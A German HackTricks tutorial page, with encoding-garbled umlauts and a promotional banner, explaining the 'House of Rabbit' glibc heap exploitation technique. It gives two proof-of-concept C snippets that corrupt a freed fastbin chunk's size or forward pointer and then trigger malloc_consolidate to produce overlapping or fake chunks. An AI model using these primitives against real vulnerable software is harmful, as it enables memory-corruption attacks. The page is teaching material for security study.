# Haus des Kaninchens

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks in PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

### Anforderungen

1. **F√§higkeit zum √Ñndern des Fastbin-fd-Zeigers oder der Gr√∂√üe**: Dies bedeutet, dass Sie den Vorw√§rtszeiger eines Chunks im Fastbin √§ndern oder seine Gr√∂√üe √§ndern k√∂nnen.
2. **F√§higkeit zum Ausl√∂sen von `malloc_consolidate`**: Dies kann durch Zuweisen eines gro√üen Chunks oder durch Zusammenf√ºhren des Top-Chunks erreicht werden, was dazu f√ºhrt, dass der Heap Chunks konsolidiert.

### Ziele

1. **√úberlappende Chunks erstellen**: Einen Chunk mit einem anderen √ºberlappen lassen, um weitere Heap-Manipulationen zu erm√∂glichen.
2. **F√§lschung von Fake-Chunks**: Den Allocator dazu bringen, einen gef√§lschten Chunk w√§hrend der Heap-Operationen als legitimen Chunk zu behandeln.

## Schritte des Angriffs

### POC 1: √Ñndern der Gr√∂√üe eines Fastbin-Chunks

**Ziel**: Erstellen eines √ºberlappenden Chunks durch Manipulation der Gr√∂√üe eines Fastbin-Chunks.

* **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x40);  // Allocates another chunk of 0x40 bytes at 0x602050
malloc(0x10);                          // Allocates a small chunk to change the fastbin state
```
* **Schritt 2: Freigeben von Chunks**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
free(chunk2);  // Frees the chunk at 0x602050
```
Wir geben beide Chunks frei und f√ºgen sie der fastbin-Liste hinzu.

* **Schritt 3: Gr√∂√üen√§nderung des Chunks**
```cpp
chunk1[-1] = 0xa1;  // Modify the size of chunk1 to 0xa1 (stored just before the chunk at chunk1[-1])
```
* **Schritt 4: Trigger `malloc_consolidate`**
```cpp
malloc(0x1000);  // Allocate a large chunk to trigger heap consolidation
```
Die Zuweisung eines gro√üen Chunks l√∂st die `malloc_consolidate`-Funktion aus, die kleine Chunks im Fastbin zusammenf√ºhrt. Die manipulierte Gr√∂√üe von `chunk1` f√ºhrt dazu, dass sie mit `chunk2` √ºberlappt.

Nach der Konsolidierung √ºberlappt `chunk1` mit `chunk2`, was weitere Ausnutzung erm√∂glicht.

### POC 2: √Ñndern des FD-Zeigers

**Ziel**: Erstellen eines Fake-Chunks durch Manipulation des Fastbin-FD-Zeigers.

* **Schritt 1: Chunks zuweisen**
```cpp
unsigned long* chunk1 = malloc(0x40);  // Allocates a chunk of 0x40 bytes at 0x602000
unsigned long* chunk2 = malloc(0x100); // Allocates a chunk of 0x100 bytes at 0x602050
```
**Erkl√§rung**: Wir allozieren zwei Chunks, einen kleineren und einen gr√∂√üeren, um den Heap f√ºr den Fake Chunk vorzubereiten.

* **Schritt 2: Fake Chunk erstellen**
```cpp
chunk2[1] = 0x31;  // Fake chunk size 0x30
chunk2[7] = 0x21;  // Next fake chunk
chunk2[11] = 0x21; // Next-next fake chunk
```
* **Schritt 3: Freigeben von Chunk1**
```cpp
free(chunk1);  // Frees the chunk at 0x602000
```
**Erkl√§rung**: Wir geben `chunk1` frei und f√ºgen ihn der Fastbin-Liste hinzu.

* **Schritt 4: √Ñndern des FD von Chunk1**
```cpp
chunk1[0] = 0x602060;  // Modify the fd of chunk1 to point to the fake chunk within chunk2
```
**Erkl√§rung**: Wir √§ndern den Vorw√§rtszeiger (fd) von `chunk1` so, dass er auf unseren gef√§lschten Chunk innerhalb von `chunk2` zeigt.

* **Schritt 5: `malloc_consolidate` ausl√∂sen**
```cpp
malloc(5000);  // Allocate a large chunk to trigger heap consolidation
```
Die erneute Zuweisung eines gro√üen Chunks l√∂st `malloc_consolidate` aus, das den Fake-Chunk verarbeitet.

Der Fake-Chunk wird Teil der Fastbin-Liste, was ihn zu einem legitimen Chunk f√ºr weitere Ausnutzungen macht.

### Zusammenfassung

Die **House of Rabbit**-Technik beinhaltet entweder die √Ñnderung der Gr√∂√üe eines Fastbin-Chunks, um √ºberlappende Chunks zu erstellen, oder die Manipulation des fd-Zeigers, um Fake-Chunks zu erstellen. Dies erm√∂glicht es Angreifern, legitime Chunks im Heap zu f√§lschen und verschiedene Formen der Ausnutzung zu erm√∂glichen. Das Verst√§ndnis und die praktische Anwendung dieser Schritte werden Ihre F√§higkeiten zur Heap-Ausnutzung verbessern.
